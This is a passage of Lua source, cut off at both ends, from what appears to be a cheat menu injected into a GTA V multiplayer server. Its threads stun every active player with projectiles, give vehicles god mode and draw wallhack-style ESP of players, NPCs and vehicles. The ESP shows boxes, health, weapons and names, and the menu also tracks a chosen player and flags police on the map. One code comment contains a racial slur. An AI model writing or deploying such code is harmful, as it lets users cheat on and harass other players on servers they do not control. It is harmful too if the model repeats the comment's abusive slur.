                    for _, player in ipairs(wmlua.N.GetActivePlayers()) do

                        wmlua.V.tpxyz = wmlua.N.GetEntBonePos(wmlua.N.GetPlayerPed(player), 31086)
                        wmlua.V.tpx, wmlua.V.tpy, wmlua.V.tpz = table.unpack(wmlua.V.tpxyz)
                        wmlua.H.WMInvokeNative(0x867654CBC7606F2C, wmlua.V.tpx, wmlua.V.tpy + 0.2, wmlua.V.tpz, wmlua.V.tpx, wmlua.V.tpy, wmlua.V.tpz, 0.0, true, wmlua.N.GetHashKey("weapon_stungun"), wmlua.N.GetPlayerPed(), false, true, 0.0)

                    end

                end

            end)

            if error then
                error = error:gsub("upvalue '", "global '") wmlua_print(error:gsub("wmlua", wmlua2))
            end

        end

    end)

    wmlua_Thread(function() -- 250ms Loop

        while wmlua_Schleep ~= nil do

            local _, error = wmlua_pcall(function() wmlua_Schleep(60)

                if wmlua.N.DoesEntityExist(wmlua.P.RCCar.Driver) and wmlua.N.DoesEntityExist(wmlua.P.RCCar.Entity) and wmlua.N.IsPedInAVehicle(wmlua.P.RCCar.Driver) ~= true then
                    wmlua.N.TaskWarpPedIntoVehicle(wmlua.P.RCCar.Driver, wmlua.P.RCCar.Entity, -1)
                end

            end)

            if error then
                error = error:gsub("upvalue '", "global '") wmlua_print(error:gsub("wmlua", wmlua2))
            end

        end

    end)

    wmlua_Thread(function() -- 250ms Loop

        while wmlua_Schleep ~= nil do

            local _, error = wmlua_pcall(function() wmlua_Schleep(200)

                if wmlua.V.Cop_blip == 0 then
                    wmlua.V.Cop_blip = 1
                else
                    wmlua.V.Cop_blip = 0
                end

                wmlua.T.Vehicles = {}
                local vehList = wmlua.N.GetEntList("CVehicle")
                for i = 1, #vehList do
                    wmlua.F.InsertToTable(wmlua.T.Vehicles, {entity = vehList[i], model = wmlua.N.GetEntityModel(vehList[i]), displayname = wmlua.N.GetVehicleName(wmlua.N.GetEntityModel(vehList[i]))})
                end

                if wmlua.T.Cheese[wmlua.T.FI["wmlua.V.Veh_godmode"]].active then
                    wmlua.N.WadaGM(wmlua.N.GetVehiclePedIsUsing(wmlua.N.GetPlayerPed()), true, 21.1337)
                end

                if wmlua.T.Cheese[wmlua.T.FI["wmlua.V.Veh_bulletprooftires"]].active then
                    wmlua.N.SetCanTiresPop(wmlua.N.GetVehiclePedIsUsing(wmlua.N.GetPlayerPed()), false)
                end

                if wmlua.T.Cheese[wmlua.T.FI["wmlua.V.RC_godmode"]].active then
                    wmlua.N.WadaGM(wmlua.P.RCCar.Entity, true, 21.1337)
                end

                wmlua.F.TList()

                if wmlua ~= nil and wmlua.T.Cheese[wmlua.T.FI["wmlua.V.Vis_bigmap"]].active and not IsBigmapActive() then

                    wmlua.H.WMInvokeNative(0x231C8F89D0539D8F, true, false)

                elseif not wmlua.T.Cheese[wmlua.T.FI["wmlua.V.Vis_bigmap"]].active and IsBigmapActive() then

                    wmlua.H.WMInvokeNative(0x231C8F89D0539D8F, false, false)

                end

                if wmlua.V.Oth_trackother then
                    wmlua.N.SetNewWaypoint(wmlua.N.GetEntityPos(wmlua.N.GetPlayerPed(wmlua.V.PlayerToTrack)))
                end

            end)

            if error then
                error = error:gsub("upvalue '", "global '") wmlua_print(error:gsub("wmlua", wmlua2))
            end

        end

    end)

    wmlua_Thread(function()

        while wmlua_Schleep ~= nil do

            local _, error = wmlua_pcall(function() wmlua_Schleep(0)

                if wmlua.T.Cheese[wmlua.T.FI["wmlua.V.Vis_safeplayerblips"]].active then

                    for _, player in ipairs(wmlua.N.GetActivePlayers()) do
                        wmlua_Schleep(0)
                        wmlua.V.pb_ped = wmlua.N.GetPlayerPed(player)
                        if wmlua.V.pb_ped ~= wmlua.N.GetPlayerPed() then
                            wmlua.V.pbSid = wmlua.N.GetPlayerServerId(player)
                            if wmlua.T.spblips[wmlua.V.pbSid] ~= nil and wmlua.T.spblips[wmlua.V.pbSid].sid == wmlua.V.pbSid then
                                wmlua.V.pb = wmlua.T.spblips[wmlua.V.pbSid].blip
                            else
                                wmlua.V.pb = AddBlipForCoord(wmlua.N.GetEntityPos(wmlua.V.pb_ped))
                                wmlua.T.spblips[wmlua.V.pbSid] = {blip = wmlua.V.pb, sid = wmlua.V.pbSid}
                            end

                            if IsPedInAnyPoliceVehicle(wmlua.V.pb_ped) then
                                if wmlua.V.Cop_blip == 0 then
                                    wmlua.H.WMInvokeNative(wmlua.STRINGS[63], wmlua.V.pb, 1)
                                else
                                    wmlua.H.WMInvokeNative(wmlua.STRINGS[63], wmlua.V.pb, 3)
                                end
                            else
                                wmlua.H.WMInvokeNative(wmlua.STRINGS[63], wmlua.V.pb, 0)
                            end

                            wmlua.H.WMInvokeNative(wmlua.STRINGS[66], wmlua.V.pb, 0.9)
                            wmlua.H.WMInvokeNative(wmlua.STRINGS[67], wmlua.V.pb, true)
                            wmlua.H.WMInvokeNative(wmlua.STRINGS[68], wmlua.V.pb, player)
                            wmlua.H.WMInvokeNative(wmlua.STRINGS[30], wmlua.V.pb, 0)
                            if wmlua.N.GetEntityHealth(wmlua.V.pb_ped) > 0 then
                                wmlua.H.WMInvokeNative(wmlua.STRINGS[65], wmlua.V.pb, true)
                                wmlua.H.WMInvokeNative(wmlua.STRINGS[64], wmlua.V.pb, 1) -- Peeper
                            else
                                wmlua.H.WMInvokeNative(wmlua.STRINGS[64], wmlua.V.pb, 274) -- DEAD boi
                                wmlua.H.WMInvokeNative(wmlua.STRINGS[65], wmlua.V.pb, false)
                            end
                            wmlua.H.WMInvokeNative(0xAE2AF67E9D9AF65D, wmlua.V.pb, table.unpack(wmlua.N.GetEntityPos(wmlua.V.pb_ped)))

                        end

                    end

                end

            end)

            if error then
                error = error:gsub("upvalue '", "global '") wmlua_print(error:gsub("wmlua", wmlua2))
            end

        end

    end)

    wmlua.V.show_healthbarText = false

    wmlua_Thread(function() -- Visuals Thread

        while wmlua_Schleep ~= nil do

            local _, error = wmlua_pcall(function() wmlua_Schleep(0)

                wmlua.V.GTime = wmlua.N.Get_GameTimer()
                wmlua.F.DrawEventLog()

                wmlua.V.ImpactF, wmlua.V.ImpactC = wmlua.N.GetLastBulletImpact(wmlua.N.GetPlayerPed())

                if wmlua.V.ImpactF then
                    wmlua.V.ix,wmlua.V.iy,wmlua.V.iz = table.unpack(wmlua.V.ImpactC)
                    local o = wmlua.N.GetEntBonePos(wmlua.N.GetPlayerPed(), 57005)
                    if o then wmlua.F.InsertToTable(wmlua.T.Impacts, {impact_time = wmlua.V.GTime, origin_x = o[1], origin_y = o[2], origin_z = o[3], ix = wmlua.V.ix, iy = wmlua.V.iy, iz = wmlua.V.iz}) end
                end

                wmlua.I.TCount = wmlua.I.TCount + 1

                if wmlua.T.Cheese[wmlua.T.FI["wmlua.V.Vis_impacts"]].active then

                    for k,v in ipairs(wmlua.T.Impacts) do
                        if v.impact_time > wmlua.V.GTime - wmlua.V.Vis_impact_dt then
                            wmlua.N.DrawLine(v.origin_x, v.origin_y, v.origin_z, v.ix, v.iy, v.iz, 102, 255, 255,255)
                        end
                    end

                end

                if wmlua.T.Cheese[wmlua.T.FI["wmlua.V.Vis_noeffects"]].active then
                    wmlua.N.StopScreenEffects()
                end

                if wmlua.T.Cheese[wmlua.T.FI["wmlua.V.Vis_antifirstperson"]].active then
                    DisableFirstPersonCamThisFrame()
                    DisableVehicleFirstPersonCamThisFrame()
                end

                if wmlua.T.Cheese[wmlua.T.FI["wmlua.V.Vis_drawtalking"]].active and wmlua.T.Cheese[wmlua.T.FI["wmlua.V.AllDraw"]].active then -- 1x Problem, if multiple people (in vehicle) then will render over each other, fix inbound when i care.

                    for _, player in ipairs(wmlua.N.GetActivePlayers()) do

                        if wmlua.N.NetIsPlayerActive(player) and NetworkIsPlayerTalking(player) then

                            wmlua.V.player_coords = wmlua.N.GetEntityPos(wmlua.N.GetPlayerPed(player))
                            if wmlua.N.CompareDistance(wmlua.N.GetEntityPos(wmlua.N.GetPlayerPed()), wmlua.V.player_coords.x, wmlua.V.player_coords.y, wmlua.V.player_coords.z) <= NetworkGetTalkerProximity() then
                                wmlua.F.vDrawText3D(wmlua.V.player_coords.x, wmlua.V.player_coords.y, wmlua.V.player_coords.z + 1.0, wmlua.STRINGS[52] .. wmlua.N.GetPlayerServerId(player) .. wmlua.STRINGS[2] .. string.sub(wmlua.N.GetPlayerName(player), 1, 20), {255,255,255,255})
                            end

                        end

                    end

                end

                if wmlua.T.Cheese[wmlua.T.FI['wmlua.V.Vis_vision']].realval == 2 then

                    wmlua.H.WMInvokeNative(0x0F07E7745A236711)
                    wmlua.H.WMInvokeNative(0x5096FD9CCB49056D, 'mp_lad_night')
                    wmlua.H.WMInvokeNative(0x2C328AF17210F009, 100)

                elseif wmlua.T.Cheese[wmlua.T.FI['wmlua.V.Vis_vision']].realval == 3 then

                    wmlua.H.WMInvokeNative(0x0F07E7745A236711)
                    wmlua.H.WMInvokeNative(0x5096FD9CCB49056D, 'INT_NO_fogALPHA')
                    wmlua.H.WMInvokeNative(0x2C328AF17210F009, 100)

                end

                if wmlua.T.Cheese[wmlua.T.FI["wmlua.V.Vis_npc_esp"]].active and wmlua.T.Cheese[wmlua.T.FI["wmlua.V.AllDraw"]].active then

                    local pList = wmlua.N.GetEntList("CPed")
                    for i = 1, #pList do
                        local ped = pList[i]
                        if wmlua.N.IsPedAPlayer(ped) == false and wmlua.N.IsEntOnScreen(ped) then
                            if wmlua.N.CompareDistance(wmlua.F.GetDynamicPosition(), wmlua.N.GetEntityPos(ped)) < tonumber(wmlua.V.Vis_npc_esp_dist) then
                                local x,y,z = table.unpack(wmlua.N.GetEntBonePos(ped, 31086))
                                if wmlua.N.IsEntityDead(ped) then
                                    wmlua.F.vDrawText3D(x,y,z, wmlua.F.NPCModelName(wmlua.N.GetEntityModel(ped)), {170,170,170,255})
                                elseif IsPedInCombat(ped, wmlua.N.GetPlayerPed()) then
                                    wmlua.F.vDrawText3D(x,y,z, wmlua.F.NPCModelName(wmlua.N.GetEntityModel(ped)), {255,100,100,255})
                                else
                                    wmlua.F.vDrawText3D(x,y,z, wmlua.F.NPCModelName(wmlua.N.GetEntityModel(ped)), {255,255,255,255})
                                end
                            end
                        end
                    end

                end

                wmlua.V.ProximityESP_Offset = 0
                wmlua.V.ProximityESP_Count = 0
                local drawC = 0
                if wmlua.Playerlist_Closest_Players then
                    for i = 1, #wmlua.Playerlist_Closest_Players do
                        local player = wmlua.Playerlist_Closest_Players[i].player
                        if player ~= wmlua.N.PlayerId() or wmlua.T.Cheese[wmlua.T.FI["wmlua.V.Vis_localtoggle"]].active then
                            local sid = wmlua.N.GetPlayerServerId(player)
                            local pPed = wmlua.N.GetPlayerPed(player)
                            local tPos = wmlua.N.GetEntBonePos(pPed, 0, 0.0)
                            local sPos = wmlua.F.GetDynamicPosition()
                            local dist = wmlua.F.Round(#(tPos - sPos), 2)
                            local os = wmlua.N.IsEntityOnScreen(pPed)
                            local r,g,b,a = 255, 255, 255, 255
                            if wmlua.Playerlist_Closest_Players[i].friend then
                                r,g,b,a = 0, 255,100, 255
                            elseif wmlua.N.IsEntityDead(pPed) then
                                r,g,b,a = 130, 130, 130, 255
                            elseif wmlua.N.HasEntityClearLosToEntity(wmlua.N.GetPlayerPed(), pPed, 19) then
                                r,g,b,a = 255, 40, 0, 255
                            end
                            if os and drawC < 30 then
                                wmlua.N.SetDrawOrigin(tPos)
                                local hPos = wmlua.N.GetEntBonePos(pPed, 0, 0.0)
                                local os1, _, top = wmlua.N.World3dToScreen(hPos.x, hPos.y, hPos.z + 0.9)
                                local os2, _, bot = wmlua.N.World3dToScreen(hPos.x, hPos.y, hPos.z - 1.2)
                                local height = bot-top
                                local width = height / 4
                                local sideOffset = width / 2
                                local heightOffset = height / 2
                                local widthh = width / 28
                                local heighth = widthh * 0.996
                                widthh = wmlua.F.ClampInt(widthh, 0.0005, 0.001, true)
                                heighth = wmlua.F.ClampInt(heighth, 0.001, 0.00225, true)
                                if wmlua.N.IsEntityDead(pPed) then
                                    wmlua.V.healthp = 0.0
                                else
                                    wmlua.V.healthp = (wmlua.N.GetEntityMaxHealth(pPed) / 2) + wmlua.N.GetEntityHealth(pPed) - wmlua.N.GetEntityMaxHealth(pPed)
                                end
                                if os1 and os2 and wmlua.T.Cheese[wmlua.T.FI["wmlua.V.Vis_2dboxes2"]].active then
                                    wmlua.menu.f.drawrect_pure({manualorigin = true, xo = 0.0 - sideOffset + (widthh / 1.5), yo = 0.0, w = widthh * 2.1, h = height * 0.996}, {red = 0, green = 0, blue = 0, alpha = a}) -- left
                                    wmlua.menu.f.drawrect_pure({manualorigin = true, xo = 0.0 + sideOffset - (widthh / 1.5), yo = 0.0, w = widthh * 2.1, h = height * 0.996}, {red = 0, green = 0, blue = 0, alpha = a}) -- right
                                    wmlua.menu.f.drawrect_pure({manualorigin = true, xo = 0.0, yo = 0.0 + heightOffset - (widthh / 1.5), w = width * 1.01, h = heighth * 2.1}, {red = 0, green = 0, blue = 0, alpha = a}) -- top
                                    wmlua.menu.f.drawrect_pure({manualorigin = true, xo = 0.0, yo = 0.0 - heightOffset + (widthh / 1.5), w = width * 1.01, h = heighth * 2.1}, {red = 0, green = 0, blue = 0, alpha = a}) -- bottom
                                    --
                                    wmlua.menu.f.drawrect_pure({manualorigin = true, xo = 0.0 - sideOffset + (widthh / 1.5), yo = 0.0, w = widthh, h = height * 0.996}, {red = r, green = g, blue = b, alpha = a}) -- left
                                    wmlua.menu.f.drawrect_pure({manualorigin = true, xo = 0.0 + sideOffset - (widthh / 1.5), yo = 0.0, w = widthh, h = height * 0.996}, {red = r, green = g, blue = b, alpha = a}) -- right
                                    wmlua.menu.f.drawrect_pure({manualorigin = true, xo = 0.0, yo = 0.0 + heightOffset - (widthh / 1.5), w = width, h = heighth}, {red = r, green = g, blue = b, alpha = a}) -- top
                                    wmlua.menu.f.drawrect_pure({manualorigin = true, xo = 0.0, yo = 0.0 - heightOffset + (widthh / 1.5), w = width, h = heighth}, {red = r, green = g, blue = b, alpha = a}) -- bottom
                                end
                                if os1 and os2 and wmlua.T.Cheese[wmlua.T.FI["wmlua.V.Vis_2dboxes"]].active then
                                    wmlua.menu.f.drawrect_pure({manualorigin = true, xo = 0.0, yo = 0.0, w = width, h = height}, {red = 0, green = 0, blue = 0, alpha = 75})
                                    wmlua.menu.f.drawrect_pure({manualorigin = true, xo = 0.0 - sideOffset + (widthh / 1.5), yo = 0.0, w = widthh * 2.1, h = height * 0.996}, {red = 0, green = 0, blue = 0, alpha = a}) -- left
                                    wmlua.menu.f.drawrect_pure({manualorigin = true, xo = 0.0 + sideOffset - (widthh / 1.5), yo = 0.0, w = widthh * 2.1, h = height * 0.996}, {red = 0, green = 0, blue = 0, alpha = a}) -- right
                                    wmlua.menu.f.drawrect_pure({manualorigin = true, xo = 0.0, yo = 0.0 + heightOffset - (widthh / 1.5), w = width * 1.01, h = heighth * 2.1}, {red = 0, green = 0, blue = 0, alpha = a}) -- top
                                    wmlua.menu.f.drawrect_pure({manualorigin = true, xo = 0.0, yo = 0.0 - heightOffset + (widthh / 1.5), w = width * 1.01, h = heighth * 2.1}, {red = 0, green = 0, blue = 0, alpha = a}) -- bottom
                                    --
                                    wmlua.menu.f.drawrect_pure({manualorigin = true, xo = 0.0 - sideOffset + (widthh / 1.5), yo = 0.0, w = widthh, h = height * 0.996}, {red = r, green = g, blue = b, alpha = a}) -- left
                                    wmlua.menu.f.drawrect_pure({manualorigin = true, xo = 0.0 + sideOffset - (widthh / 1.5), yo = 0.0, w = widthh, h = height * 0.996}, {red = r, green = g, blue = b, alpha = a}) -- right
                                    wmlua.menu.f.drawrect_pure({manualorigin = true, xo = 0.0, yo = 0.0 + heightOffset - (widthh / 1.5), w = width, h = heighth}, {red = r, green = g, blue = b, alpha = a}) -- top
                                    wmlua.menu.f.drawrect_pure({manualorigin = true, xo = 0.0, yo = 0.0 - heightOffset + (widthh / 1.5), w = width, h = heighth}, {red = r, green = g, blue = b, alpha = a}) -- bottom
                                end
                                local letext = ""
                                
                                if wmlua.T.Cheese[wmlua.T.FI["wmlua.V.Vis_nametags"]].active then
                                    letext = letext .. sid .. " > " .. string.sub(wmlua.N.GetPlayerName(player), 1, 15) .. " (" .. math.floor(dist) .. "m)"
                                end
                                if wmlua.T.Cheese[wmlua.T.FI["wmlua.V.Vis_healthbars"]].active and wmlua.V.show_healthbarText then
                                    letext = letext .. "\nHP: " .. wmlua.V.healthp
                                end
                                if wmlua.T.Cheese[wmlua.T.FI["wmlua.V.Vis_weaponesp"]].active then
                                    if wmlua.T.Wephashes[wmlua.N.Get_SelectedPedWeapon(pPed)] then letext = letext .. "\nWEP: " .. wmlua.T.Wephashes[wmlua.N.Get_SelectedPedWeapon(pPed)].label end
                                end
                                    
                                if os1 and os2 and letext ~= "" then
                                    local sideOffset = width / 1.8
                                    local heightOffset = height / 2.1
                                    local elscale = 0.26
                                    local elscale2 = dist * 0.003
                                    elscale = wmlua.F.ClampInt(elscale - elscale2, 0.18, 0.3, true)
                                    wmlua.menu.f.drawtext({text = letext, x = 0.0 + sideOffset, y = 0.0 - heightOffset, size = elscale, font = 0, center = true}, {red = r, green = g, blue = b, alpha = a})
                                end
                                if os1 and os2 and wmlua.T.Cheese[wmlua.T.FI["wmlua.V.Vis_healthbars"]].active then
                                    local sideOffset = width / 1.8
                                    local heightOffset = height / 2.5
                                    local leHeight2 = (-height * (wmlua.V.healthp / 100)) * 0.992
                                    wmlua.menu.f.drawrect_pure({manualorigin = true, xo = 0.0 - sideOffset + (widthh * (-dist/(dist*0.45))), yo = 0.0, w = widthh * 2.2, h = height}, {red = 0, green = 0, blue = 0, alpha = a}) -- left
                                    wmlua.menu.f.drawrect_pure({manualorigin = true, xo = 0.0 - sideOffset + (widthh * (-dist/(dist*0.45))), yo = ((height/2.015) + (leHeight2/2)), w = widthh, h = leHeight2}, {red = r, green = g, blue = b, alpha = a}) -- left
                                end
                                
                                wmlua.N.ClearDrawOrigin()
                                drawC = drawC + 1
                            end
    
                            if wmlua.T.Cheese[wmlua.T.FI["wmlua.V.Vis_lineesp"]].active then
                                local x,y,z = table.unpack(sPos)
                                local x2,y2,z2 = table.unpack(tPos)
                                wmlua.N.DrawLine(x,y,z, x2,y2,z2, r,g,b,a)
                            end
    
                            if wmlua.T.Cheese[wmlua.T.FI["wmlua.V.Vis_proximityesp"]].active and wmlua.V.ProximityESP_Count < 19 then
                                if wmlua.menu.v.drawmenu and wmlua.V.EI_Active then 
                                    wmlua.menu.f.drawtext({text = 'Player: ' .. wmlua.F.CleanString(wmlua.N.GetPlayerName(player), "color") .. " (" .. dist .. "m)", x = 0.700, y = 0.48 + wmlua.V.ProximityESP_Offset, scale = 0.1, size = 0.30, font = 4}, {red = r, green = g, blue = b, alpha = a})
                                else
                                    wmlua.menu.f.drawtext({text = 'Player: ' .. wmlua.F.CleanString(wmlua.N.GetPlayerName(player), "color") .. " (" .. dist .. "m)", x = 0.700, y = 0.355 + wmlua.V.ProximityESP_Offset, scale = 0.1, size = 0.30, font = 4}, {red = r, green = g, blue = b, alpha = a})
                                end
                                wmlua.V.ProximityESP_Offset = wmlua.V.ProximityESP_Offset + 0.02
                                wmlua.V.ProximityESP_Count = wmlua.V.ProximityESP_Count + 1
                            end
    
                            if wmlua.T.Cheese[wmlua.T.FI["wmlua.V.Vis_litplayers"]].active then 
                
                                local x,y,z = table.unpack(wmlua.N.GetEntityPos(wmlua.Playerlist_Closest_Players[i].ped))
                                wmlua.N.DrawSpotLight(x,y,z + 9.15,0.0,0.0,-1000.0, wmlua.V.lpr,wmlua.V.lpg,wmlua.V.lpb,10.125, wmlua.V.Vis_litplayers_bn, 0.0, 2.05, 2.25)
            
                            end
                        
                        end

                    end
                
                end

                if wmlua.T.Cheese[wmlua.T.FI["wmlua.V.Vis_vehesp"]].active and wmlua.T.Cheese[wmlua.T.FI["wmlua.V.AllDraw"]].active then
                    for i, v in ipairs(wmlua.T.Vehicles) do
                        wmlua.V.x, wmlua.V.y, wmlua.V.z = table.unpack(wmlua.N.GetEntityPos(v.entity, true))
                        wmlua.V.distance = wmlua.N.CompareDistance(wmlua.N.GetEntityPos(wmlua.N.GetPlayerPed()), wmlua.V.x,wmlua.V.y,wmlua.V.z)
                        if wmlua.V.distance < wmlua.V.Vis_vehesp_dist and wmlua.N.IsEntOnScreen(v.entity) then
                            wmlua.F.vDrawText3D(wmlua.V.x, wmlua.V.y, wmlua.V.z - 0.5, v.displayname .. wmlua.STRINGS[6] .. wmlua.F.Round(wmlua.V.distance,1) .. wmlua.STRINGS[8], {255, 255, 255, 255})
                        end
                    end
                end

                if wmlua.T.Cheese[wmlua.T.FI["wmlua.V.Vis_drawcoords"]].active and wmlua.T.Cheese[wmlua.T.FI["wmlua.V.AllDraw"]].active then

                    wmlua.V.px, wmlua.V.py, wmlua.V.pz = table.unpack(wmlua.F.GetDynamicPosition())

                    wmlua.V.roundx = tonumber(string.format(wmlua.STRINGS[47], wmlua.V.px))
                    wmlua.V.roundy = tonumber(string.format(wmlua.STRINGS[47], wmlua.V.py))
                    wmlua.V.roundz = tonumber(string.format(wmlua.STRINGS[47], wmlua.V.pz))
                    wmlua.V.heading = wmlua.N.GetEntityHeading(wmlua.N.GetPlayerPed())
                    wmlua.V.roundh = tonumber(string.format(wmlua.STRINGS[47], wmlua.V.heading))
                    wmlua.F.Draw2dText(wmlua.STRINGS[48] .. wmlua.V.roundx .. wmlua.STRINGS[49] .. wmlua.V.roundy .. wmlua.STRINGS[50] .. wmlua.V.roundz .. wmlua.STRINGS[51] .. wmlua.V.roundh, 0.40, 0.021, 0.0, 0.3, 0, 200, 255, 255, 0)

                end

                if wmlua.T.Cheese[wmlua.T.FI["wmlua.V.Vis_drawhp"]].active then -- shitty hp bars Xd but idc to actually impr0ve it

                    wmlua.V.pHealth = wmlua.N.GetEntityHealth(wmlua.N.GetPlayerPed())
                    wmlua.V.pArmour = wmlua.N.GetPedArmor(wmlua.N.GetPlayerPed())
                    wmlua.V.pHealth = math.ceil(wmlua.V.pHealth - 100 / 100 * 100)

                    if wmlua.V.pHealth == -100 then
                        wmlua.V.pHealth = 0
                    end

                    if type(wmlua.V.pHealth) == "number" and type(wmlua.V.pArmour) == "number" then -- lmao thought was a type problem and eh not here but ye tostring nigger, tostring

                        wmlua.F.DrawRect(0.086, 0.968, 0.070, 0.016, 30, 30, 30, 255) -- Background Left, Armor.
                        wmlua.F.DrawRect(0.087, 0.969, 0.0679, 0.013, 60, 60, 60, 255) -- Background Left, Armor.
                        wmlua.F.DrawRect(0.0868, 0.969, wmlua.V.pArmour / 1465, 0.0135, 0, 100, 150, 255) -- Armor

                        wmlua.F.Draw2dText(tostring(wmlua.V.pArmour), 0.115, 0.966, 0.28, 0.28, 255, 255, 255, 255)

                        wmlua.F.DrawRect(0.015, 0.968, 1000 / 14200, 0.016, 30, 30, 30, 255) -- Background Left, Health.
                        wmlua.F.DrawRect(0.016, 0.969, 1000 / 14600, 0.013, 60, 60, 60, 255) -- Secondary Background Left, Health.
                        wmlua.F.Draw2dText(tostring(wmlua.V.pHealth), 0.045, 0.966, 0.28, 0.28, 255, 255, 255, 255)

                        if wmlua.V.pHealth <= 100 and wmlua.V.pHealth > 70 then
                            wmlua.F.DrawRect(0.016, 0.969, wmlua.V.pHealth / 1460, 0.0135, 0, 200, 50, 200) -- Health
                        end

                        if wmlua.V.pHealth <= 70 and wmlua.V.pHealth > 20 then
                            wmlua.F.DrawRect(0.016, 0.969, wmlua.V.pHealth / 1460, 0.0135, 255, 200, 50, 200) -- Health
                        end

                        if wmlua.V.pHealth <= 20 and wmlua.V.pHealth >= 0 then
                            wmlua.F.DrawRect(0.016, 0.969, wmlua.V.pHealth / 1460, 0.0135, 255, 0, 0, 200) -- Health
                        end

                    end

                end

                if wmlua.T.Cheese[wmlua.T.FI["wmlua.V.Vis_hidenotifications"]].active then
                    wmlua.H.WMInvokeNative(wmlua.STRINGS[28])
                end

                if wmlua.T.Cheese[wmlua.T.FI["wmlua.V.Vis_alwayslit"]].active and wmlua.T.Cheese[wmlua.T.FI["wmlua.V.AllDraw"]].active then
                    wmlua.V.x, wmlua.V.y, wmlua.V.z = table.unpack(wmlua.F.GetDynamicPosition())
                    wmlua.N.DrawSpotLight(wmlua.V.x,wmlua.V.y,500.0,0.0,0.0,-1000.0, 50,50,50,1300.0, 10.0, 0.0, 720.0, 0.0)
                end

            end)

            if error then
                error = error:gsub("upvalue '", "global '") wmlua_print(error:gsub("wmlua", wmlua2))
            end

        end

    end)

    wmlua.T.GamerTags = {}

    wmlua_Thread(function() -- Visuals Thread

        while wmlua_Schleep ~= nil do

            local _, error = wmlua_pcall(function() wmlua_Schleep(60000)

                if wmlua.T.Cheese[wmlua.T.FI["wmlua.V.Vis_cleanhealthbars"]].active and wmlua.T.Cheese[wmlua.T.FI["wmlua.V.AllDraw"]].active then
                    
                    for i = 1, 2 do wmlua.F.VISCleanHealthbars() wmlua_Schleep(0) end

                end

            end)

            if error then
                error = error:gsub("upvalue '", "global '") wmlua_print(error)
            end

        end

    end)

    wmlua_Thread(function() -- Visuals Thread

        while wmlua_Schleep ~= nil do

            local _, error = wmlua_pcall(function() wmlua_Schleep(15)

                if wmlua.T.Cheese[wmlua.T.FI["wmlua.V.Vis_cleanhealthbars"]].active and wmlua.T.Cheese[wmlua.T.FI["wmlua.V.AllDraw"]].active then

                    for i, v in ipairs(wmlua.Playerlist_Closest_Players) do

                        wmlua.V.ped = v.ped
                        wmlua.V.player = v.player

                        if wmlua.V.player ~= wmlua.N.PlayerId() and wmlua.N.NetIsPlayerActive(wmlua.V.player) and not string.match(wmlua.N.GetPlayerName(wmlua.V.player), wmlua.STRINGS[9]) then

                            if not wmlua.T.GamerTags[wmlua.V.player] then
                                wmlua.T.GamerTags[wmlua.V.player] = {
                                    tag = wmlua.N.CreateGamerTag(wmlua.V.ped, "", false, false, "", 0),
                                    ped = wmlua.V.ped
                                }

                                for k,v in pairs(wmlua.T.GamerTags) do
                                    wmlua.N.SetGamerTagVisibility(v.tag, 2, true)
                                    wmlua.N.SetGamerTagAlpha(v.tag, 2, 255)
                                    wmlua.N.SetGamerTagColor(v.tag, 2, 18)
                                    wmlua.N.GamerTagHealthbarColor(v.tag, 18)
                                end
                            end

                        end

                    end

                end


            end)

            if error then
                error = error:gsub("upvalue '", "global '") wmlua_print(error:gsub("wmlua", wmlua2))
            end

        end

    end)

    wmlua_Thread(function() -- 0 MS Loop (Menu)

        wmlua.V.KillTimer = 0

        while wmlua_Schleep ~= nil do

            local _, error = wmlua_pcall(function() wmlua_Schleep(0)

                wmlua.H.WMInvokeNative(0xFE99B66D079CF6BC, 0, wmlua.S.menuKey, true)

                -- Draw Menu Check

                if wmlua.menu.v.drawmenu and wmlua.T.Cheese[wmlua.T.FI["wmlua.V.AllDraw"]].active then
                    wmlua.N.DisplayCursor()
                    wmlua.H.WMInvokeNative(0x8DB8CFFD58B62552, 8)
                    wmlua.menu.f.drawmenu()
                end

                -- Hotkeys

                if wmlua.F.HoldingCTRL(0, 21) and wmlua.F.PressedCTRL(0, 172) and wmlua.V.InputActive == false and wmlua.menu.v.drawmenu then

                    if wmlua.menu.v.buttons_scroll_cur - 2 > 0 then
                        wmlua.menu.v.buttons_scroll_cur = wmlua.menu.v.buttons_scroll_cur - 2
                    end

                end

                if wmlua.F.HoldingCTRL(0, 21) and wmlua.F.PressedCTRL(0, 173) and wmlua.V.InputActive == false and wmlua.menu.v.drawmenu then

                    if wmlua.menu.v.buttons_scroll_cur + 2 <= #wmlua.T.MenuButtons then
                        wmlua.menu.v.buttons_scroll_cur = wmlua.menu.v.buttons_scroll_cur + 2
                    end

                end

                if wmlua.F.PressedCTRL(0, 175) and wmlua.V.InputActive == false and wmlua.menu.v.drawmenu then -- Right Key

                    wmlua.V.MenuSelectedTab = wmlua.V.MenuSelectedTab + 1

                    if wmlua.V.MenuSelectedTab > wmlua.menu.v.tabs_scroll_cur then
                        wmlua.menu.v.tabs_scroll_cur = wmlua.F.ClampInt(wmlua.V.MenuSelectedTab - wmlua.menu.v.tabs_scroll_max, 1, #wmlua.T.MenuTabs, true)
                    elseif wmlua.menu.v.tabs_scroll_cur > wmlua.V.MenuSelectedTab then
                        wmlua.menu.v.tabs_scroll_cur = wmlua.V.MenuSelectedTab
                    end

                    for i = 1, #wmlua.T.MenuTabs do
                        if wmlua.V.MenuSelectedTab == i then
                            wmlua.F.TabChange(wmlua.T.MenuTabs[i].name)
                        end

                    end

                elseif wmlua.F.PressedCTRL(0, 174) and wmlua.V.InputActive == false and wmlua.menu.v.drawmenu then -- Left Key

                    wmlua.V.MenuSelectedTab = wmlua.V.MenuSelectedTab - 1

                    if wmlua.V.MenuSelectedTab < 1 then
                        wmlua.V.MenuSelectedTab = #wmlua.T.MenuTabs
                    end

                    if wmlua.V.MenuSelectedTab > wmlua.menu.v.tabs_scroll_cur then
                        wmlua.menu.v.tabs_scroll_cur = wmlua.F.ClampInt(wmlua.V.MenuSelectedTab - wmlua.menu.v.tabs_scroll_max, 1, #wmlua.T.MenuTabs, true)
                    elseif wmlua.menu.v.tabs_scroll_cur > wmlua.V.MenuSelectedTab then
                        wmlua.menu.v.tabs_scroll_cur = wmlua.V.MenuSelectedTab
                    end

                    for i = 1, #wmlua.T.MenuTabs do

                        if wmlua.V.MenuSelectedTab == i then

                            wmlua.F.TabChange(wmlua.T.MenuTabs[i].name)

                        end

                    end

                elseif wmlua.F.PressedCTRL(0, 173) and wmlua.V.InputActive == false and wmlua.menu.v.drawmenu then -- Down Key

                    if wmlua.V.MenuSelectedButton + 1 <= #wmlua.T.MenuButtons then
                        wmlua.V.MenuSelectedButton = wmlua.V.MenuSelectedButton + 1
